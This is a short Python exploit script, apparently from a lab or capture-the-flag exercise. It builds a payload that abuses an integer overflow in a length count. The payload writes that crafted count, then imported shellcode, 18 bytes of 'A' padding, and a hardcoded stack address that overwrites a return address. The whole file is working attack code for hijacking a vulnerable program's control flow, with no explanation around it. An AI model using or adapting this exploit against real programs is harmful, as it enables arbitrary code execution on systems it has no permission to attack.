#!/usr/bin/env python3

import sys

from shellcode import shellcode

count = int((18446744073709551615 + 216)/4)
test = count.to_bytes(8, 'little')
sys.stdout.buffer.write(test)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*18)
sys.stdout.buffer.write(0x7ffffff68560.to_bytes(8,'little'))
